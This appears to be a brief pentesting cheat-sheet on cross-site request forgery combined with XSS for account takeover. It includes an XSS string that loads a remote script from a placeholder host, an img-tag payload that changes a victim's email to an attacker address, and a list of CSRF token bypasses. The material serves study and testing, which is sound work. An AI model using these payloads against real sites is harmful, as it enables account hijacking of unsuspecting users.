`CSRF` attacks may utilize `XSS` vulnerabilities to perform certain queries, and `API` calls on a web application that the victim is currently authenticated to.

A common `CSRF` attack to gain higher privileged access to a web application is to craft a `JavaScript` payload that automatically changes the victim's password to the value set by the attacker. Once the victim views the payload on the vulnerable page (e.g., a malicious comment containing the `JavaScript` `CSRF` payload), the `JavaScript` code would execute automatically. It would use the victim's logged-in session to change their password. Once that is done, the attacker can log in to the victim's account and control it.

```html
"><script src=//www.example.com/exploit.js></script>
```

##### Prevention
https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html

##### Deliver
GET:
`<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">`

POST: dedicated html page with form and js for auto submit

##### CSRF token bypass
* Can be omitted on GET requests
* Removing CSRF token skips validation
* CSRF token is not tied to the user session
* CSRF token is tied to a non-session cookie